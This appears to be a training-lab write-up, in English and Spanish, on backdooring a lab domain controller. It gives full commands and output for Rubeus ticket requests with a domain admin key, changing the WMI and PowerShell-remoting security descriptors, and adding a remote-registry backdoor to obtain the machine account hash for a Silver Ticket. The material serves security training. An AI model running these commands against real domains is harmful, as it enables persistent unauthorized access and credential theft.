# Learning Objetive 13

* Modify security descriptors on `dcorp-dc` to get access using PowerShell remoting and WMI without requiring administrator access.
* Retrieve machine account hash from `dcorp-dc` without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

***

> Una vez que tienes privilegios de Domain Admin, modificas los Security Descriptors (permisos) de WMI y PowerShell Remoting en el Domain Controller para que tu usuario normal (student453) pueda ejecutar comandos remotos sin necesidad de ser administrador local en el DC.

<mark style="background-color:orange;">Once we have administrative privileges on a machine</mark>, we can modify security descriptors of services to access the services without administrative privileges.

> 1. Abre una **cmd como Administrator** (elevada) en tu student VM (dcorp-std453).
> 2. Desde esa cmd elevada, lanza un proceso **como Domain Admin** (svcadmin) usando el ticket que ya tienes del ejercicio anterior:
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
> ```
>
> → Se abrirá una **nueva ventana de cmd** corriendo como **svcadmin** (Domain Admin).

## Option 1 – Enable remote WMI for studentX

Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI:

> Change studentX

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

#### Check It

Now, we can execute WMI queries on the DC as studentx:

```
PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName dcorp-dc

SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

## Option 2 – Enable PowerShell Remoting for student453

Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it).

> **Please note that this is unstable since some patches in August 2020**:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

Now, we can run commands using PowerShell remoting on the DC without DA privileges:

```
PS C:\AD\Tools> Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

dcorp\studentx
```

### Retrieve the machine account hash (dcorp-dc$) without being a local administrator

To retrieve machine account hash without DA, first we need to modify permissions on the DC. Run the below command as DA:

> Ejecuta esto también desde la sesión de svcadmin (misma ventana):

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
PS C:\AD\Tools> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'studentx'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not running, attempting to start
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry through StdRegProv
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103
(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local studentx

```
